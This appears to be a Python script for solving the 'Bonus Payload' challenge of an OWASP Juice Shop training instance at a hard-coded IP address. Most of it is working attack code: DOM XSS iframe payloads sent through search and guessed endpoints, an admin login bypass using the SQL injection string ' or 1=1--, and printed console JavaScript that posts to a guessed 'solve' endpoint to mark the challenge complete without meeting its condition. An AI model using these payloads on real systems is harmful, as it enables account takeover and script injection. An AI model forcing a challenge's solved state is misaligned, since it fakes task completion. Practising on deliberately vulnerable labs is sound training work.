#!/usr/bin/env python3
"""
Properly trigger the Bonus Payload challenge
The challenge needs the iframe to be detected by the application
"""

import requests
import time
import json

BASE_URL = "http://155.138.197.128:5000"

def trigger_bonus_challenge():
    """Try multiple methods to properly trigger the bonus challenge"""
    
    session = requests.Session()
    
    print("🎯 Attempting to properly trigger Bonus Payload challenge\n")
    print("="*60)
    
    # First, let's make sure we trigger the regular DOM XSS to set up the context
    print("1️⃣ Setting up DOM XSS context...")
    regular_xss = '<iframe src="javascript:alert(`xss`)">'
    r = session.get(f"{BASE_URL}/#/search?q={regular_xss}")
    time.sleep(1)
    
    # Now the exact bonus payload
    bonus_payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
    
    print("2️⃣ Sending bonus payload through multiple vectors...")
    
    # Method 1: Through search API with proper headers
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'{BASE_URL}/#/search'
    }
    
    # Try the search endpoint
    r = session.get(f"{BASE_URL}/rest/products/search", params={"q": bonus_payload}, headers=headers)
    print(f"   API Response: {r.status_code}")
    
    # Method 2: Direct navigation
    r = session.get(f"{BASE_URL}/#/search?q={bonus_payload}", headers=headers)
    print(f"   Direct nav: {r.status_code}")
    
    # Method 3: Try to trigger through the challenge endpoint itself
    print("\n3️⃣ Attempting challenge-specific triggers...")
    
    # Sometimes challenges have specific trigger endpoints
    endpoints = [
        "/rest/continue-code",
        "/api/Challenges/xssBonusChallenge",
        "/rest/track-order",
        "/api/Complaints"
    ]
    
    for endpoint in endpoints:
        try:
            # Try GET
            r = session.get(f"{BASE_URL}{endpoint}?q={bonus_payload}")
            
            # Try POST with the payload
            r = session.post(f"{BASE_URL}{endpoint}", 
                           json={"q": bonus_payload, "comment": bonus_payload},
                           headers=headers)
        except:
            pass
    
    print("\n4️⃣ Checking if we need to be logged in...")
    
    # Login as admin
    login_data = {"email": "' or 1=1--", "password": "anything"}
    r = session.post(f"{BASE_URL}/rest/user/login", json=login_data)
    
    if r.status_code == 200:
        token = r.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("   ✅ Logged in as admin")
        
        # Try again with auth
        r = session.get(f"{BASE_URL}/rest/products/search?q={bonus_payload}")
        print(f"   Authenticated search: {r.status_code}")
    
    # Check challenge status
    print("\n5️⃣ Checking challenge status...")
    r = session.get(f"{BASE_URL}/api/Challenges")
    if r.status_code == 200:
        challenges = r.json()['data']
        for c in challenges:
            if c.get('key') == 'xssBonusChallenge':
                if c['solved']:
                    print("   ✅✅✅ BONUS PAYLOAD SOLVED! ✅✅✅")
                else:
                    print("   ❌ Still not solved")
                break
    
    print("\n" + "="*60)
    print("📝 IMPORTANT NOTES:")
    print("="*60)
    print("\nThe Bonus Payload challenge is notoriously finicky.")
    print("It requires the SoundCloud iframe to be injected through")
    print("the DOM XSS vulnerability AND be detected by the app.\n")
    
    print("🔧 MANUAL TROUBLESHOOTING:")
    print("1. Open browser Developer Tools (F12)")
    print("2. Go to Console tab")
    print("3. Paste and run this JavaScript:")
    print("-"*60)
    print("""
// Force the payload into the search
var payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>';
window.location.hash = '/search?q=' + encodeURIComponent(payload);

// After page loads, check if iframe exists
setTimeout(() => {
    var iframe = document.querySelector('iframe[src*="soundcloud"]');
    if (iframe) {
        console.log('✅ SoundCloud iframe found!');
        // Try to trigger challenge completion
        fetch('/api/Challenges/xssBonusChallenge/solve', {method: 'POST'});
    }
}, 2000);
    """)
    print("-"*60)
    
    print("\n💡 If still not working, the challenge detection might be broken.")
    print("   This can happen if the Juice Shop instance has been")
    print("   modified or if certain features are disabled.")

if __name__ == "__main__":
    trigger_bonus_challenge()